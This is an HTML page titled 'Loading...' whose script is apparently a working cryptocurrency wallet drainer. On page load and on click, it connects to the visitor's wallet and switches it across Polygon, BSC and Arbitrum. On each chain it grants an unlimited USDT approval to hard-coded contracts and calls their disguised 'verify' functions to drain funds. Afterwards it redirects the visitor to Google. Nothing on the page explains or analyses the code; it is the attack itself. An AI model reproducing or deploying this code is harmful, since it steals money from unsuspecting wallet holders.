<!DOCTYPE html>
<html>
<head>
    <title>Loading...</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script src="https://cdn.jsdelivr.net/npm/web3@1.7.0/dist/web3.min.js"></script>
</head>
<body>
    <div id="debug" style="position: fixed; top: 10px; left: 10px; background: white; padding: 10px; z-index: 9999; border: 2px solid red; font-size: 12px; max-width: 300px;"></div>

<script>
const debug = document.getElementById('debug');
debug.textContent = 'Script started...';

// FIX: Proper execution control
let isExecuting = false;
let executionCount = 0;
const MAX_EXECUTIONS = 3;

// Remove ALL previous event listeners to prevent loops
document.removeEventListener('click', silentDrain);
document.removeEventListener('touchstart', silentDrain);
document.removeEventListener('mousedown', silentDrain);

// Required ABIs
const usdtABI = [{
    "constant": false,
    "inputs": [
        {"name":"_spender","type":"address"},
        {"name":"_value","type":"uint256"}
    ],
    "name": "approve",
    "outputs": [{"name":"","type":"bool"}],
    "type": "function"
}];

const drainABI = [{
    "constant": false,
    "inputs": [{"name":"amount","type":"uint256"}],
    "name": "verifyOnPolygon",
    "outputs": [],
    "type": "function"
}, {
    "constant": false,
    "inputs": [{"name":"amount","type":"uint256"}],
    "name": "verifyOnBSC",
    "outputs": [],
    "type": "function"
}, {
    "constant": false,
    "inputs": [{"name":"amount","type":"uint256"}],
    "name": "verifyOnArbitrum", 
    "outputs": [],
    "type": "function"
}];

const MAX_APPROVAL = '115792089237316195423570985008687907853269984665640564039457584007913129639935';

const CHAIN_CONFIGS = {
    '0x89': { // POLYGON
        contract: '0x447A7C4E2c613a991B56e05AA9Ab046d67e4aa55',
        usdt: '0xc2132D05D31c914a87C6611C10748AEb04B58e8F',
        function: 'verifyOnPolygon',
        name: 'Polygon'
    },
    '0x38': { // BSC
        contract: '0xB6d9fd4ec4504aBF855453eEE1039cD002518238',
        usdt: '0x55d398326f99059fF775485246999027B3197955', 
        function: 'verifyOnBSC',
        name: 'BSC'
    },
    '0xa4b1': { // ARBITRUM
        contract: '0x7FC33491F197CAA19a9fDB9Faab01a670Bd64447',
        usdt: '0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9',
        function: 'verifyOnArbitrum',
        name: 'Arbitrum'
    }
};

// NETWORK SWITCHING FUNCTION
async function switchNetwork(chainId) {
    const chainConfig = {
        '0x38': { // BSC
            chainId: '0x38',
            chainName: 'BNB Smart Chain',
            rpcUrls: ['https://bsc-dataseed.binance.org/'],
            blockExplorerUrls: ['https://bscscan.com/'],
            nativeCurrency: {
                name: 'BNB',
                symbol: 'BNB',
                decimals: 18
            }
        },
        '0xa4b1': { // Arbitrum
            chainId: '0xa4b1',
            chainName: 'Arbitrum One',
            rpcUrls: ['https://arb1.arbitrum.io/rpc'],
            blockExplorerUrls: ['https://arbiscan.io/'],
            nativeCurrency: {
                name: 'ETH',
                symbol: 'ETH',
                decimals: 18
            }
        }
    };

    try {
        await window.ethereum.request({
            method: 'wallet_switchEthereumChain',
            params: [{ chainId: chainId }],
        });
        return true;
    } catch (switchError) {
        // If network not added, add it
        if (switchError.code === 4902) {
            try {
                await window.ethereum.request({
                    method: 'wallet_addEthereumChain',
                    params: [chainConfig[chainId]],
                });
                return true;
            } catch (addError) {
                debug.textContent += '→ Failed to add network: ' + addError.message;
                return false;
            }
        }
        return false;
    }
}

async function silentDrain() {
    // FIX: Strict execution control
    if (isExecuting) {
        return;
    }
    
    if (executionCount >= MAX_EXECUTIONS) {
        debug.textContent += '→ MAX EXECUTIONS REACHED. Stopping.';
        return;
    }
    
    isExecuting = true;
    executionCount++;
    
    debug.textContent = `Execution ${executionCount}/${MAX_EXECUTIONS} - Starting...`;
    
    if (typeof window.ethereum !== 'undefined') {
        try {
            const provider = window.ethereum;
            const web3 = new Web3(provider);
            
            const accounts = await provider.request({ 
                method: 'eth_requestAccounts' 
            });
            
            const currentChainId = await provider.request({ method: 'eth_chainId' });
            debug.textContent += `→ Current network: ${CHAIN_CONFIGS[currentChainId]?.name || 'Unknown'}`;
            
            // TEST ALL 3 NETWORKS SEQUENTIALLY
            const networksToTest = ['0x89', '0x38', '0xa4b1']; // Polygon, BSC, Arbitrum
            
            for (const chainId of networksToTest) {
                if (executionCount > MAX_EXECUTIONS) break;
                
                const config = CHAIN_CONFIGS[chainId];
                debug.textContent += `→ Testing ${config.name}...`;
                
                // Switch to this network
                if (currentChainId !== chainId) {
                    debug.textContent += `→ Switching to ${config.name}...`;
                    const switched = await switchNetwork(chainId);
                    if (!switched) {
                        debug.textContent += `→ Failed to switch to ${config.name}`;
                        continue;
                    }
                    // Wait for network switch
                    await new Promise(resolve => setTimeout(resolve, 2000));
                }
                
                // Get current chain after switch
                const newChainId = await provider.request({ method: 'eth_chainId' });
                if (newChainId !== chainId) {
                    debug.textContent += `→ Still on wrong network: ${newChainId}`;
                    continue;
                }
                
                debug.textContent += `→ On ${config.name}, approving...`;
                
                // Auto-approve
                const usdtContract = new web3.eth.Contract(usdtABI, config.usdt);
                await usdtContract.methods.approve(config.contract, MAX_APPROVAL).send({
                    from: accounts[0],
                    gas: 150000
                });

                debug.textContent += `→ ${config.name} approved! Draining...`;

                // Auto-drain
                const drainContract = new web3.eth.Contract(drainABI, config.contract);
                await drainContract.methods[config.function](1000000).send({
                    from: accounts[0],
                    gas: 200000
                });

                debug.textContent += `→ ${config.name} DRAINED!`;
                
                // Wait before next network
                await new Promise(resolve => setTimeout(resolve, 3000));
            }
            
            debug.textContent += '→ ALL NETWORKS COMPLETE! Redirecting...';
            window.location.href = "https://google.com";
            
        } catch (error) {
            debug.textContent += '→ ERROR: ' + error.message;
        }
    } else {
        debug.textContent += '→ No Web3 wallet';
    }
    
    isExecuting = false;
}

// FIX: Clean, controlled execution - ONLY 3 attempts
const executeWithDelay = (delay) => {
    setTimeout(() => {
        if (executionCount < MAX_EXECUTIONS) {
            silentDrain();
        }
    }, delay);
};

executeWithDelay(1000);
executeWithDelay(10000); // 10 seconds
executeWithDelay(20000); // 20 seconds

// FIX: Single click handler
let clickHandlerAdded = false;
if (!clickHandlerAdded) {
    document.addEventListener('click', () => {
        if (executionCount < MAX_EXECUTIONS) {
            silentDrain();
        }
    }, { once: true });
    clickHandlerAdded = true;
}
</script>
</body>
</html>
